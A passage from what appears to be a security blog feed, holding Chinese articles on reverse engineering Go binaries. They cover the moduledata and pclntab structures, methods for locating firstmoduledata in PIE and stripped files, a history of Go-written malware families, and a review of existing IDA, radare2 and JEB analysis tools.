class="keyword">struct</span> &#123;</div><div class="line">    pclntable    []<span class="keyword">byte</span>    <span class="comment">// pclntab address</span></div><div class="line">    ftab         []functab <span class="comment">// function table address</span></div><div class="line">    filetab      []<span class="keyword">uint32</span>  <span class="comment">// source file table address</span></div><div class="line">    findfunctab  <span class="keyword">uintptr</span></div><div class="line">    minpc, maxpc <span class="keyword">uintptr</span>   <span class="comment">// minpc: first pc(function) address</span></div><div class="line"></div><div class="line">    text, etext           <span class="keyword">uintptr</span>  <span class="comment">// [.text] section start/end address</span></div><div class="line">    noptrdata, enoptrdata <span class="keyword">uintptr</span></div><div class="line">    data, edata           <span class="keyword">uintptr</span>  <span class="comment">// [.data] section start/end address</span></div><div class="line">    bss, ebss             <span class="keyword">uintptr</span>  <span class="comment">// [.bss] section start/end address</span></div><div class="line">    noptrbss, enoptrbss   <span class="keyword">uintptr</span>  <span class="comment">// [.noptrbss] section start/end address</span></div><div class="line">    end, gcdata, gcbss    <span class="keyword">uintptr</span></div><div class="line">    types, etypes         <span class="keyword">uintptr</span>  <span class="comment">// types data start/end address</span></div><div class="line"></div><div class="line">    textsectmap []textsect</div><div class="line">    typelinks   []<span class="keyword">int32</span>    <span class="comment">// offset table for types</span></div><div class="line">    itablinks   []*itab    <span class="comment">// interface table</span></div><div class="line"></div><div class="line">    ptab []ptabEntry</div><div class="line"></div><div class="line">    pluginpath <span class="keyword">string</span></div><div class="line">    pkghashes  []modulehash</div><div class="line"></div><div class="line">    modulename   <span class="keyword">string</span></div><div class="line">    modulehashes []modulehash</div><div class="line"></div><div class="line">    hasmain <span class="keyword">uint8</span> <span class="comment">// 1 if module contains the main function, 0 otherwise</span></div><div class="line"></div><div class="line">    gcdatamask, gcbssmask bitvector</div><div class="line"></div><div class="line">    typemap <span class="keyword">map</span>[typeOff]*_type <span class="comment">// offset to *_rtype in previous module</span></div><div class="line"></div><div class="line">    bad <span class="keyword">bool</span> <span class="comment">// module failed to load and should be ignored</span></div><div class="line"></div><div class="line">    next *moduledata</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>根据 <strong>Moduledata</strong> 的定义，Moduledata 是可以串成链表的形式的，而一个完整的可执行 Go 二进制文件中，只有一个 <strong>firstmoduledata</strong> 包含如上完整的字段。简单介绍一下关键字段：</p>
<ul>
<li>第 1 个字段 <strong>pclntable</strong>，即为 <strong>pclntab</strong> 的地址；</li>
<li>第 2 个字段 <strong>ftab</strong>，为 <strong>pclntab</strong> 中 Function Table 的地址(=pclntab_addr + 8)；</li>
<li>第 3 个字段 <strong>filetab</strong>，为 <strong>pclntab</strong> 中 Source File Table 的地址；</li>
<li>第 5 个字段 <strong>minpc</strong>，为 <strong>pclntab</strong> 中第一个函数的起始地址；</li>
<li>第 7 个字段 <strong>text</strong>，在普通二进制文件中，对应于 [.text] section 的起始地址；在 PIE 二进制文件中则没有这个要求；</li>
<li>字段 <strong>types</strong>，为存放程序中所有数据类型定义信息数据的起始地址，一般对应于 [.rodata] section 的地址；</li>
<li>字段 <strong>typelinks</strong>，为每个数据类型相对于 <strong>types</strong> 地址的偏移表，该字段与 <strong>types</strong> 字段在后文解析 RTTI 时要用到；</li>
<li>字段 <strong>itablinks</strong>，则是 Interface Table 的起始地址，该字段解析 Interface Table 时要用到。</li>
</ul>
<p><strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 在 IDAPro 中对 <strong>firstmoduledata</strong> 的解析结果示例如下：</p>
<p><img src="/imgs/go_re/firstmoduledata_in_ida.png" alt=""></p>
<p>需要注意的是，Go 语言中，一个 Slice 类型数据的底层定义要用到 3 个元素：(Data Address, Length, Capacity)。所以在 IDAPro 中看某个 Slice 类型的字段，要一次看 3 个 uintptr 元素。</p>
<h3 id="7-2-firstmoduledata-定位"><a href="#7-2-firstmoduledata-定位" class="headerlink" title="7.2 firstmoduledata 定位"></a>7.2 firstmoduledata 定位</h3><p>通过上面的介绍可以知道，如果在 Go 二进制文件中事先找到 <strong>firstmoduledata</strong> 这个结构，然后在这个结构中就可以按图索骥找到其他我们感兴趣的信息。那么如何在一个 Go 二进制文件中精准定位到 <strong>firstmoduledata</strong> 呢？</p>
<p>很直观就想到 <strong>pclntab</strong>，原因有两点：一是它对应于 <strong>firstmoduledata</strong> 结构的第一个字段；最主要的是 <strong>pclntab</strong> 包含的信息丰富，起始位置还有独特的 4-Bytes 的 Magic Number。一旦找到了 <strong>pclntab</strong> ，就可以定位到 <strong>firstmoduledata</strong>。</p>
<h4 id="7-2-1-定位-pclntab"><a href="#7-2-1-定位-pclntab" class="headerlink" title="7.2.1 定位 pclntab"></a>7.2.1 定位 pclntab</h4><p>定位 <strong>pclntab</strong> 的方法，公开的相关工具里用的最多的，是根据二进制文件中的 Section Name 来定位。因为平常见到的 Go 二进制文件，PE 文件和 ELF 文件中 <code>.gopclntab</code> Section 就对应于 <strong>pclntab</strong> 结构，MachO 文件中 <code>__gopclntab</code> Section 对应于 <strong>pclntab</strong> 结构。</p>
<p>然而<strong>这种方法并不靠谱</strong>。</p>
<p>最主要的原因，是 <strong>PIE</strong> 二进制文件。PIE 全称为 <strong>Position Independent Executable</strong>，意思是<strong>地址无关的可执行文件</strong>，这个类型的二进制文件结合 ASLR 技术可以加强 Go 二进制文件自身安全性。这对 Go 自身的内存安全机制来说，是个锦上添花的特性。Go 的 <strong>build/install</strong> 命令在构建二进制文件时，有几个 <strong>buildmode</strong> 选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">➜ go help buildmode</div><div class="line">The &apos;go build&apos; and &apos;go install&apos; commands take a -buildmode argument which</div><div class="line">indicates which kind of object file is to be built. Currently supported values</div><div class="line">are:</div><div class="line"></div><div class="line">        -buildmode=archive</div><div class="line">                Build the listed non-main packages into .a files. Packages named</div><div class="line">                main are ignored.</div><div class="line"></div><div class="line">        -buildmode=c-archive</div><div class="line">                Build the listed main package, plus all packages it imports,</div><div class="line">                into a C archive file. The only callable symbols will be those</div><div class="line">                functions exported using a cgo //export comment. Requires</div><div class="line">                exactly one main package to be listed.</div><div class="line"></div><div class="line">        -buildmode=c-shared</div><div class="line">                Build the listed main package, plus all packages it imports,</div><div class="line">                into a C shared library. The only callable symbols will</div><div class="line">                be those functions exported using a cgo //export comment.</div><div class="line">                Requires exactly one main package to be listed.</div><div class="line"></div><div class="line">        -buildmode=default</div><div class="line">                Listed main packages are built into executables and listed</div><div class="line">                non-main packages are built into .a files (the default</div><div class="line">                behavior).</div><div class="line"></div><div class="line">        -buildmode=shared</div><div class="line">                Combine all the listed non-main packages into a single shared</div><div class="line">                library that will be used when building with the -linkshared</div><div class="line">                option. Packages named main are ignored.</div><div class="line"></div><div class="line">        -buildmode=exe</div><div class="line">                Build the listed main packages and everything they import into</div><div class="line">                executables. Packages not named main are ignored.</div><div class="line"></div><div class="line">        -buildmode=pie</div><div class="line">                Build the listed main packages and everything they import into</div><div class="line">                position independent executables (PIE). Packages not named</div><div class="line">                main are ignored.</div><div class="line"></div><div class="line">        -buildmode=plugin</div><div class="line">                Build the listed main packages, plus all packages that they</div><div class="line">                import, into a Go plugin. Packages not named main are ignored.</div></pre></td></tr></table></figure>
<p>Go 在构建可执行 ELF 文件时，目前还是默认使用 <code>-buildmode=exe</code>，而从 2019 年 4 月底 Go 语言官方 <strong><a href="https://go-review.googlesource.com/c/go/+/203606/" target="_blank" rel="external">Change Log 203606</a></strong> 开始，在 Windows 上构建可执行 PE 文件时，则会默认使用 <code>-buildmode=pie</code>：</p>
<p><img src="/imgs/go_re/pie_change_log.png" alt=""></p>
<p>下图是同一个项目，用 3 种不同的编译方式生成的可执行 ELF 文件 Section Headers 对比，从左至右编译方式依次为：</p>
<ol>
<li>go build</li>
<li>go build -ldflags “-s -w”</li>
<li>go build -buildmode=pie -ldflags “-s -w”</li>
</ol>
<p><img src="/imgs/go_re/multi_bin_sect_comp.png" alt=""></p>
<p>可以看到，第三种编译方式生成的 PIE 文件，是没有 <code>.gopclntab</code> 这个 Section 的，而是多了一些重定向相关的 Section。这也是前文《<a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">Go二进制文件逆向分析从基础到进阶——综述</a>》中 <strong>redress</strong> 工具报错的原因：它根据 Section Name 查找 <strong>pclntabl</strong> 的思路，对 PIE 文件无效。</p>
<p>既然靠 Section Name 来定位 <strong>pclntab</strong> 的方式不靠谱，其他能用的方式就只剩暴力搜索 <strong>pclntab</strong> 的 Magic Number 了。通过研究发现，无论是否 PIE ，ELF 文件中的<strong>firstmoduledata</strong> 总是在 <code>.noptrdata</code> 这个 Section 里，PE 文件中可能会在 <code>.data</code> 或 <code>.noptrdata</code> Section，而 MachO 文件中的 <strong>firstmoduledata</strong> 会在 <code>__noptrdata</code> Section 中。如此一来，就可以按 uintptr 为单元遍历目标 Section，检查每个 uintptr 指向的地址前 4 字节是否为 <strong>pclntab</strong> 的 Magic Number <strong>0xFFFFFFFB</strong>，找到这个位置，就差不多了。伪码可表示为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dword(uintptr(possible_firstmoduledata_addr)) &amp; 0xFFFFFFFF == MagicNumber</div></pre></td></tr></table></figure>
<p>之所以说 <strong>差不多</strong>，是因为二进制文件中可能还有别的值为 <strong>0xFFFFFFFB</strong>，并不是所有这个值的位置都是 <strong>pclntab</strong>。找到这个值，还要精准验证它是不是 <strong>pclntab</strong>，以及上级数据结构是不是 <strong>firstmoduledata</strong> 。</p>
<h4 id="7-2-2-验证-firstmoduledata"><a href="#7-2-2-验证-firstmoduledata" class="headerlink" title="7.2.2 验证 firstmoduledata"></a>7.2.2 验证 firstmoduledata</h4><p>按照上述思路，找到一个<strong>可能的</strong> firstmoduledata 起始地址，其第一个 uintptr 元素指向的位置，前 4 字节为 <strong>pclntab</strong> 的 Magic Number。如果是真实的 <strong>firstmoduledata</strong>，它内部是有几个字段可以跟 <strong>pclntab</strong> 中的数据进行交叉验证的，比如：</p>
<ul>
<li>firstmoduledata.ftab == pclntab_addr + 8</li>
<li>firstmoduledata.filetab == firstmoduledata.ftab + pclntab.functab_size + sizeof(uintptr)</li>
<li>firstmoduledata.minpc == firstmoduledata.text_addr == uintptr(pclntbl_addr + 8 + ADDR_SZ) == first function of pclntab.functab</li>
</ul>
<p>当然，不一定要验证上面所有条件，验证其中一部分甚至一个关键条件，就可以确认当前地址是否为真正的 <strong>firstmoduledata</strong>。</p>
<p>另外，随着 Go 的持续迭代， <strong>pclntab</strong> 和 <strong>moduledata</strong> 的结构定义也会发生变化。《<a href="http://home.in.tum.de/~engelke/pubs/1709-ma.pdf" target="_blank" rel="external">Reconstructing Program Semantics from Go Binaries</a>》 中对比过几个版本的 <strong>moduledata</strong> 之间的区别：</p>
<p><img src="/imgs/go_re/moduledata_diff.png" alt=""></p>
<p>我们对此结构的解析，也要随着 Go 语言的迭代而进行相应调整，否则可能 Go 语言发了一个新版，里面改动了关键数据结构，我们按照旧的结构去解析，就会出错。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/215419&quot;&gt;https://www.anquanke.com/post/id/215419&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;书接前文，本文主要介绍 Go 二进制文件中 Meta Information 的解析，与&lt;strong&gt;函数符号&lt;/strong&gt;和&lt;strong&gt;源码文件路径列表&lt;/strong&gt;的提取。最后详细介绍一下 &lt;strong&gt;Moduledata&lt;/strong&gt; 这个结构。&lt;/p&gt;
&lt;p&gt;传送门： &lt;a href=&quot;https://www.anquanke.com/post/id/214940&quot;&gt;Go二进制文件逆向分析从基础到进阶(1)——综述&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;5-Meta-information&quot;&gt;&lt;a href=&quot;#5-Meta-information&quot; class=&quot;headerlink&quot; title=&quot;5. Meta information&quot;&gt;&lt;/a&gt;5. Meta information&lt;/h2&gt;&lt;h3 id=&quot;5-1-Go-Build-ID&quot;&gt;&lt;a href=&quot;#5-1-Go-Build-ID&quot; class=&quot;headerlink&quot; title=&quot;5.1 Go Build ID&quot;&gt;&lt;/a&gt;5.1 Go Build ID&lt;/h3&gt;&lt;p&gt;每一个 Go 二进制文件内，都有一个独一无二的 Build ID，详情参考 &lt;a href=&quot;https://golang.org/src/cmd/go/internal/work/buildid.go&quot;&gt;src/cmd/go/internal/work/buildid.go&lt;/a&gt; 。Go Build ID 可以用以下命令来查看：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ go tool buildid &amp;lt;GoBinaryFilePath&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于 ELF 文件，也可以用 &lt;strong&gt;readelf&lt;/strong&gt; 命令查看，不过看到的只是 Hex String：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/go_re/go_buildid.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;转换一下上图的 Hex String，就是 &lt;code&gt;$ go buildid tracker_nonstrip&lt;/code&gt; 的显示结果了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/go_re/buildid_hex2str.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="golang" scheme="http://jiayu0x.com/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>Go二进制文件逆向分析从基础到进阶(1)——综述</title>
    <link href="http://jiayu0x.com/2020/08/22/go-binary-reverse-engineering-summary/"/>
    <id>http://jiayu0x.com/2020/08/22/go-binary-reverse-engineering-summary/</id>
    <published>2020-08-21T16:00:00.000Z</published>
    <updated>2020-09-25T09:53:44.456Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本文首发于安全客： <a href="https://www.anquanke.com/post/id/214940" target="_blank" rel="external">https://www.anquanke.com/post/id/214940</a></p>
</blockquote>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>Go 语言是一个比较新的强类型静态语言，2009 年由 Google 发布，在 2012 年才发布首个稳定版。Go 语言靠 Goroutine 和 channel、wait group、select、context 以及 sync 等辅助机制实现的 CSP 并发模型，以简洁高效编写高并发程序为亮点，很快就在全球范围内吸引大量开发者使用其编写各种程序。现在 Go 已成为云原生领域的首选开发语言。</p>
<p>由于 Go 语言上手快，编码效率高，程序运行效率也高，而且很方便跨平台交叉编译，也吸引了恶意软件开发者的注意。渐渐地，安全厂商开始捕获到越来越多的 <a href="https://unit42.paloaltonetworks.com/the-gopher-in-the-room-analysis-of-golang-malware-in-the-wild/" target="_blank" rel="external">Go 语言编写的恶意软件</a> ，这些恶意软件横跨 Windows、Linux 和 Mac 三大平台。</p>
<p>然而，Go 语言的编译工具链会全静态链接构建二进制文件，把标准库函数和第三方 package 全部做了静态编译，再加上 Go 二进制文件中还打包进去了 runtime 和 GC(Garbage Collection，垃圾回收) 模块代码，所以即使做了 strip 处理( <code>go build -ldflags &quot;-s -w&quot;</code> )，生成的二进制文件体积仍然很大。在反汇编工具中打开 Go 语言二进制文件，可以看到里面包含动辄几千个函数。再加上 Go 语言的独特的函数调用约定、栈结构和多返回值机制，使得对 Go 二进制文件的分析，无论是静态逆向还是动态调式分析，都比分析普通的二进制程序要困难很多。</p>
<p>不过，好消息是安全社区还是找到了针对性的方法，让安全分析人员对 Go 语言二进制文件的逆向变得更加轻松。最开始有人尝试过针对函数库做符号 Signature 来导入反汇编工具中，还原一部分二进制文件中的函数符号。后来有人研究出 Go 语言二进制文件内包含大量的运行时所需的符号和类型信息，以及字符串在 Go 二进制文件中独特的用法，然后开发出了针对性的符号甚至类型信息恢复工具。至此，对 Go 语言二进制文件的逆向分析工作，就变得轻松异常了。</p>
<p>本系列文章将简单介绍 Go 语言二进制文件逆向姿势的发展历史，以及几个典型的恶意程序家族。然后详细介绍基于二进制文件内置的符号、类型信息来逆向分析 Go 语言二进制文件的技术原理和工具，最后以实际的分析案例演示前面介绍的工具和方法。至于还有人研究出<a href="http://home.in.tum.de/~engelke/pubs/1709-ma.pdf" target="_blank" rel="external">基于符号执行和形式化定理证明</a>的高深技术，来恢复 Go 语言二进制文件的符号和类型信息的姿势，不在本文讨论范围之内。<del>因为鄙人也没研究明白</del></p>
<a id="more"></a>
<h2 id="2-典型的恶意程序"><a href="#2-典型的恶意程序" class="headerlink" title="2. 典型的恶意程序"></a>2. 典型的恶意程序</h2><p>早在 2012 年，Symantec(现已被博通收购)就曝光了一个 Go 语言编写的 Windows 平台上的恶意软件：<strong><a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=7a3cd022-0705-43fb-8c11-181ec86b2c74&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments" target="_blank" rel="external">Encriyoko</a></strong> ，这是鄙人能查到的最早的 Go 编写的恶意软件。当时，这个恶意软件在业内并没引起多大注意。</p>
<p>到了 2016 年 8 月，Go 编写的两个恶意软件被俄罗斯网络安全公司 Dr.Web 曝光，在业内吸引了很多注意：<strong><a href="https://vms.drweb.com/virus/?i=8400823&amp;lng=en" target="_blank" rel="external">Linux.Lady</a></strong> 和 <strong><a href="https://vms.drweb.com/virus/?_is=1&amp;i=8436299&amp;lng=en" target="_blank" rel="external">Linux.Rex</a></strong> 。前者后来发展成臭名昭著的 <strong><a href="https://blog.netlab.360.com/tag/ddg/" target="_blank" rel="external">DDGMiner</a></strong> ，后者则是<strong>史上第一个 Go 编写的 P2P Botnet</strong>(基于  <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> )。从公开的信息来看，正是从这时开始，业内的安全研究人员开始对 Go 二进制文件的逆向分析进行初步探索。</p>
<p>2017 年，TrendMicro 曝光了一个<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/following-trail-blacktech-cyber-espionage-campaigns/" target="_blank" rel="external">大型的黑客团伙 BlackTech</a> ，他们用到的一个核心的数据窃取工具 <strong>DRIGO</strong>，即是用 Go 语言编写。2019 年 <a href="https://www.welivesecurity.com/2019/09/24/no-summer-vacations-zebrocy/" target="_blank" rel="external">ESET 发布一篇报告</a>，分析了 APT28 组织用到的知名后门工具 <strong>Zebrocy</strong> ，也有了 Go 语言版本。这也说明 Go 语言编写的木马越来越成熟，Go 语言开始被大型黑客组织纳入编程工具箱。</p>
<p>再往后，Go 语言编写的恶意软件就呈泛滥的态势了。2020 年初，鹅厂还曝光过一个功能比较复杂的跨平台恶意挖矿木马 <strong><a href="https://s.tencent.com/research/report/904.html" target="_blank" rel="external">SysupdataMiner</a></strong> ，也是由 Go 语言编写。就在最近， Guardicore 刚爆光了一个 <a href="https://www.guardicore.com/2020/08/fritzfrog-p2p-botnet-infects-ssh-servers/" target="_blank" rel="external">Go 编写的功能复杂的 P2P Botnet: <strong>FritzFrog</strong></a> 。</p>
<h2 id="3-已有研究与工具"><a href="#3-已有研究与工具" class="headerlink" title="3. 已有研究与工具"></a>3. 已有研究与工具</h2><p>前文说过，Go 语言二进制文件有它自己的特殊性，使得它分析起来跟普通的二进制文件不太一样。主要有以下三个方面：</p>
<ul>
<li><p>Go 语言内置一些复杂的数据类型，并支持类型的组合与方法绑定，这些复杂数据类型在汇编层面有独特的表示方式和用法。比如 Go 二进制文件中的 string 数据不是传统的以 <code>0x00</code> 结尾的 C-String，而是用 (StartAddress, Length) 两个元素表示一个 string 数据；比如一个 slice 数据要由 (StartAddress, Length, Capacity) 三个元素表示。这样的话，在汇编代码中看，给一个函数传一个 string 类型的参数，其实要传两个值；给一个函数传一个 slice 类型的参数，其实要传 3 个值。返回值同理；</p>
<p><img src="/imgs/go_re/function_stack_structure.png" alt=""></p>
</li>
<li><p>独特的调用约定和栈管理机制，使 C/C++ 二进制文件逆向分析的经验在这里力不从心：Go 语言用的是 <a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.5.html" target="_blank" rel="external">continue stack 栈管理机制</a> ，并且 Go 语言函数中 callee 的栈空间由 caller 来维护，callee 的参数、返回值都由 caller 在栈中预留空间，就难以直观看出哪个是参数、哪个是返回值。详见 <a href="https://dr-knz.net/go-calling-convention-x86-64.html" target="_blank" rel="external">The Go low-level calling convention on x86-64</a> ；</p>
</li>
<li><p>全静态链接构建，里面函数的数量动辄大几千，如果没有调试信息和符号，想静态逆向分析其中的特定功能点，如大海捞针，很容易迷失在函数的海洋中；动态调试难度更大，其独特的 Goroutine 调度机制再加上海量的函数，很容易调飞。</p>
</li>
</ul>
<p>由于恶意软件大都是被 strip 处理过，已经去除了二进制文件里的调试信息和函数符号，所以 Go 二进制文件的逆向分析技术的探索，前期主要围绕着函数符号的恢复来展开。</p>
<p>最早是有人尝试过为函数符号做 Signature ，然后把 Signature 导入到反汇编工具里的做法。这是一个 Hard Way 的笨办法，比较原始，但挺实用。r2con 2016 上 zl0wram 的议题《<a href="https://www.youtube.com/watch?v=PRLOlY4IKeA&amp;feature=youtu.be" target="_blank" rel="external">Reversing Linux Malware</a>》中就演示过这种做法：</p>
<p><img src="/imgs/go_re/gen_sym_sig.png" alt=""></p>
<p>进一步，大家发现了隐藏在 Go 二进制文件种 <strong>pclntab</strong> 结构中的函数名信息，并没有被 strip 掉，而且可以通过辅助脚本在反汇编工具里将其恢复。比如 RedNaga 的 <strong><a href="https://twitter.com/timstrazz" target="_blank" rel="external">@timstrazz</a></strong> 写了一篇 <strong><a href="https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/" target="_blank" rel="external">Reversing GO binaries like a pro</a></strong> ，详细讲述了如何从被 strip 的 Go 二进制文件中恢复函数符号以及解析函数中用到的字符串，让 IDAPro 逆向 Go 二进制文件变得更轻松。@timstrazz 还开源了他写的 IDA 脚本 <strong><a href="https://github.com/strazzere/golang_loader_assist" target="_blank" rel="external">golang_loader_assist</a></strong> 。</p>
<p>值得一提的是， <strong>golang_loader_assist</strong> 诞生时，旧版的 IDAPro 对 Go 二进制中的函数识别效果并不是很好，很多函数体识别不全，导致 IDAPro 的自动分析能分析出的函数量有限。所以 <strong>golang_loader_assist</strong> 实现了一种依靠 Go 语言中 <strong>连续栈(Continue Stack)</strong> 维护的机制来解析、标注函数体的功能。具体做法是靠汇编代码的特征来找出 <code>runtime_morestack</code> 和 <code>runtime_morestack_noctxt</code> 函数，然后在 IDAPro 种遍历对这两个函数交叉引用的位置来找出函数体。这是一个无奈之举，IDAPro v7.x 的版本对 Go 二进制文件中函数体的自动解析功能加强了很多，绝大部分函数都可以被识别出来，无需自己费劲去识别、解析函数体。</p>
<p>再进一步，有安全研究员发现除了可以从 <strong>pclntab</strong> 结构中解析、恢复函数符号，Go 二进制文件中还有大量的类型、方法定义的信息，也可以解析出来。这样就可以大大方便对 Go 二进制文件中复杂数据结构的逆向分析。两个代表工具：</p>
<ol>
<li>用于 radare2 的 <strong><a href="https://github.com/zlowram/radare2-scripts/tree/master/go_helpers" target="_blank" rel="external">r2_go_helper</a></strong> ，由上面提到的 zl0wram 在 r2con 2016 上发布；</li>
<li>用于 IDAPro 的 <strong><a href="https://gitlab.com/zaytsevgu/goutils" target="_blank" rel="external">GoUtils</a></strong> ，以及基于 <strong><a href="https://gitlab.com/zaytsevgu/GoUtils2.0" target="_blank" rel="external">GoUtils 2.0</a></strong> 开发的更强的 <strong><a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="external">IDAGolangHelper</a></strong> 。</li>
</ol>
<p>前文提到的 <strong><a href="https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/" target="_blank" rel="external">Reversing GO binaries like a pro</a></strong> 可能是业内最火的介绍 Go 二进制逆向的文章，但最火的工具可能还是 <strong>IDAGolangHelper</strong> ：</p>
<p><img src="/imgs/go_re/idagolanghelper.png" style="zoom:50%;"></p>
<p><strong>IDAGolangHelper</strong> 对 Go 的不同版本做了更精细化处理，而且第一次在 Go 二进制文件解析中引入 <strong>moduledata</strong> 这个数据结构。而且提供一个 GUI 界面给用户提供丰富的操作选项，用户体验更胜一筹。</p>
<p>不过 <strong>IDAGolangHelper</strong> 的缺点也非常明显：</p>
<ol>
<li><p>支持的 Golang 版本略旧。目前最高支持 Go 1.10，而最新的  Go 1.15 已经发布了。 Go 1.2 之后这些版本之间的差异并不大，所以这也不是个太大的问题；</p>
</li>
<li><p>太久不更新，目前在 IDAPro v7.x 上已经无法顺利执行，这个问题比较严重；</p>
</li>
<li><p>其内部有个独特的做法：把 Go 语言各种数据类型的底层实现，在 IDAPro 中定义成了相应的 ida_struct。这样一来，即使可以顺利在 IDAPro 中解析出各种数据类型信息，展示出来的效果并不是很直观，需要查看相应的 struct 定义才能理解类型信息中各字段的意义，而且不方便跳转操作。窃以为这种体验并不好：</p>
<p><img src="/imgs/go_re/idagolanghelper_type_struct.png" alt=""></p>
</li>
</ol>
<p>更进一步，2019 年 10 月份，JEB 官方博客发表一篇文章 《<strong><a href="https://www.pnfsoftware.com/blog/analyzing-golang-executables/" target="_blank" rel="external">Analyzing Golang Executables</a></strong>》，并发布一个 JEB 专用的 Go 二进制文件解析插件 <strong><a href="https://github.com/pnfsoftware/jeb-golang-analyzer" target="_blank" rel="external">jeb-golang-analyzer</a></strong> 。这是一个功能比前面几个工具更加完善的 Go 二进制文件解析工具，除了解析前面提到的函数名、字符串和数据类型信息，还会解析 <a href="https://en.wikipedia.org/wiki/Duff&#39;s_device" target="_blank" rel="external">Duff’s device</a> 、Source File Path list、GOROOT 以及 Interface Table 等信息。甚至会把每个 pkg 中定义的特定数据类型分门别类地列出来，比如解析某 Go 二进制文件中的部分类型信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&gt; PACKAGE: net/http:</div><div class="line"></div><div class="line">	&gt; struct http.Request (5 fields):</div><div class="line">		- string Method (offset:0)</div><div class="line">		- *url.URL URL (offset:10)</div><div class="line">		- string Proto (offset:18)</div><div class="line">		- int ProtoMajor (offset:28)</div><div class="line">		- int ProtoMinor (offset:30)</div><div class="line"></div><div class="line">&gt; PACKAGE: net/url:</div><div class="line"></div><div class="line">	&gt; struct url.URL (9 fields):</div><div class="line">		- string Scheme (offset:0)</div><div class="line">		- string Opaque (offset:10)</div><div class="line">		- *url.Userinfo User (offset:20)</div><div class="line">		- string Host (offset:28)</div><div class="line">		- string Path (offset:38)</div><div class="line">		- string RawPath (offset:48)</div><div class="line">		- bool ForceQuery (offset:58)</div><div class="line">		- string RawQuery (offset:60)</div><div class="line">		- string Fragment (offset:70)</div><div class="line"></div><div class="line">	&gt; struct url.Userinfo (3 fields):</div><div class="line">		- string username (offset:0)</div><div class="line">		- string password (offset:10)</div><div class="line">		- bool passwordSet (offset:20)</div></pre></td></tr></table></figure>
<p><strong>jeb-golang-analyzer</strong> 也有一些问题：对 strings 和 string pointers 的解析并不到位，虽然支持多种 CPU 架构类型(x86/ARM/MIPS)的字符串解析，但是 Go 二进制文件中字符串的操作方式有多种，该工具覆盖不全。另外，该工具内部定位 <strong>pclntab</strong> 的功能实现，基于 Section Name 查找和靠 Magic Number 暴力搜索来结合的方式，还是可能存在误判的可能性，一旦发生误判，找不到 <strong>pclntab</strong> 结构，至少会导致无法解析函数名的后果。最后，这个工具只能用于 JEB，而对于用惯了 IDAPro 的人来说，JEB 插件的解析功能虽强大，但在 JEB 中展示出来的效果并不是很好，而且 JEB 略卡顿，操作体验不是很好。</p>
